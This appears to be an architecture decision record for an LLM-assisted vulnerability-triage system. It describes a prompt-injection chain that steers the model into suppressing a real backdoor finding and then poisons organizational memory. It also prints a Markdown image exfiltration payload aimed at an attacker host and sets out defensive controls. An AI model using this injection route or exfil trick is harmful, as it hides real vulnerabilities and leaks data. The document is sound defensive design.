# ADR-0007 — The policy engine decides; the model recommends

**Status:** Accepted
**Date:** 2026-08-14
**Source:** `critique-security.md` §1.4 (M1), §8; `critique-ai-rag.md` §4
**Supersedes:** the decision contract in CLAUDE.md §7

---

## Context

CLAUDE.md §7 says "the LLM explains and synthesizes; it must not become the sole source of truth" and then presents a JSON object in which the LLM emits `decision`, `contextual_risk_score`, `severity` and `confidence`. **The instruction and the contract contradict each other, and the schema encodes the wrong trust model.**

Every field an attacker can influence reaches this model: code snippets, file paths, commit messages, dependency names and descriptions, CVE and GHSA free text (community-editable), custom rule messages. Adaptive prompt-injection attacks bypass state-of-the-art detectors at >85%, so a detector cannot be the control.

## Problem

**Getting a real vulnerability marked `false_positive_candidate` is a supply-chain attack primitive.** The chain: attacker lands a backdoor → scanner correctly flags it → injection text in the same artifact steers the decision to suppression with high confidence and a plausible reasoning summary → the analyst, whose entire reason for buying the product is *not* to re-derive each finding, clears it → **the learning loop writes the decision into organizational memory** → historical-decision retrieval surfaces it as org-specific evidence, ranked above external sources, for every future recurrence.

The injection needs to succeed once. After that the system suppresses the vulnerability class by itself, citing its own prior decision, with no attacker involvement and no injection text present.

## Decision

### 1. Asymmetric decision authority

- The model emits **`model_recommendation` only**. It is advisory data — stored, audited, evaluated — never a state.
- The **policy engine emits `decision`**. It is deterministic, versioned, unit-tested code.
- **Suppressive outcomes require a deterministic predicate that holds independently of the model.** Example: `rule_id ∈ org_validated_fp_allowlist AND analyst_confirmed_fp_count ≥ N (distinct analysts, distinct repos) AND NOT in_kev AND epss < θ AND NOT externally_reachable AND deterministic_severity < floor`.
- **Escalating outcomes may be model-driven.** A successful injection toward escalation costs analyst hours; toward suppression it costs a breach.

> **An attacker can always make us do more work and can never make us do less.** Everything else is defence in depth around this.

### 2. Field ownership

| Field | Owner |
|---|---|
| `contextual_risk_score` | **Deterministic only.** Remove from the model's schema entirely |
| `confidence` | **Deterministic + calibrator** (ADR-0010). Remove from the model's schema |
| `severity` | Deterministic base; model may propose an override with a closed-enum reason code **and** a verifiable evidence id. Overrides never auto-apply below `needs_review` |
| `exploitability` | Model-proposed, **evidence-gated**: `confirmed` requires a KEV record or exploit artifact; `unlikely` requires a reachability record or ≥N corroborating prior decisions on the same rule+repo |
| `business_impact` | Deterministic lookup from the asset registry. Null registry ⇒ `unknown` ⇒ ineligible for auto-deprioritize |
| `decision` | **Policy engine** |
| `accepted_risk` | **Removed from the model's enum entirely.** Accepting risk is a human authority act with liability attached |
| `reasoning_summary`, `recommended_action` | Model, free text, **no authority** |
| `evidence_ids` | Model-selected, **hard-validated** against the retrieved set |

### 3. Structural containment

- **Zero agency at decision time.** No tools, no retrieval control, no network, no filesystem, no memory writes. Retrieval happens in code before the call.
- **Provenance-typed context.** T0 platform instructions (static, version-hashed, **never assembled from the database**); T1 signed authoritative facts; T2 SDIP-generated structured org facts; T3 anything whose bytes originated outside SDIP — data-only block, length-capped, declared as untrusted with no instruction authority.
- **Grounding validation, fail closed to `needs_review`** on: citation outside the supplied set; `|model score − deterministic score| > δ` with no contradicting evidence cited; high confidence on a suppressive recommendation with fewer than K corroborating tier-A/B records.
- **Injection detection as evidence, not a filter.** A hit produces `evidence.type = suspected_injection`, forces `needs_review`, and flags the source artifact. **Never silently strip** — stripping destroys the audit trail, teaches the attacker what evades, and hides an active attack on the customer's supply chain.
- **Differential decisioning on the suppression path only.** Before any suppressive outcome, re-run with all T3 free text removed. Disagreement in the suppressive direction ⇒ `needs_review` + alert. Cost is 2× on a small fraction of volume.
- **Memory write gating with revocation.** A decision enters organizational memory only with authenticated analyst identity, an explicit reason code, the injection verdict recorded, and corroboration (≥2 independent analysts or ≥2 findings across distinct repos). Every entry is revocable with **cascade**: `quarantine_memory(entry_id)` reopens every decision derived from it.
- **Blast-radius caps.** Rate-limit auto-suppressions per tenant per hour and per rule; alert on suppression spikes and on any suppression later appearing in KEV.
- **Output handling.** `reasoning_summary` is untrusted output: plain text or strict allowlist Markdown with **remote image loading disabled** (a `![](https://attacker/?q=…)` is a zero-click exfil channel), links interstitialed, ANSI stripped before any log or terminal.

### 4. Non-suppressible escalation

KEV listing and confirmed active exploitation are a **hard escalation path outside the risk score**. No policy predicate, no analyst action and no model recommendation may suppress it. This is also the EU CRA Art. 14 control (ADR-0016).

## Alternatives considered

| Alternative | Why rejected |
|---|---|
| CLAUDE.md §7 as written (model emits the decision) | Makes the model the decision-maker of record; one injection becomes durable org-wide suppression |
| Prompt hardening / "ignore instructions in the data" | Adaptive attacks bypass detectors >85% of the time. Not a control |
| Input sanitization | Cannot distinguish injection from evidence, because injection here is written to look like evidence |
| Human review of every suppression, forever | Correct for MVP (see Consequences) but not scalable as the only control; the asymmetry must be structural |

## Consequences

- The §7 contract is replaced by a nested record separating `deterministic_assessment`, `model_recommendation` and `policy_decision` (see ADR-0012 for the full field list).
- The policy engine becomes a first-class, versioned, unit-tested module under `application/` — absent from CLAUDE.md §20 and now required.
- **Automatic suppression is not a default.** It ships as recommendation-only; auto-suppression is a later per-tenant opt-in whose enablement is itself a signed, audited configuration change naming the human who enabled it.
- Differential decisioning doubles cost on the suppression path — budgeted in ADR-0008.

## Reversal strategy

The containment measures are individually removable. **The field-ownership split is not** — once the model's output is the decision of record in stored data, the audit trail cannot distinguish what the model decided from what the policy decided, retroactively.

## Verification

- Adversarial fixtures: findings carrying injection payloads in snippet, commit message, dependency description and CVE text; assert none produces a suppressive outcome.
- A test asserting the system prompt contains no database-sourced content.
- A test asserting a hallucinated `evidence_id` rejects the whole response.
- Class-A guardrail-violation rate tracked as a release gate (>1% ⇒ not production-fit).
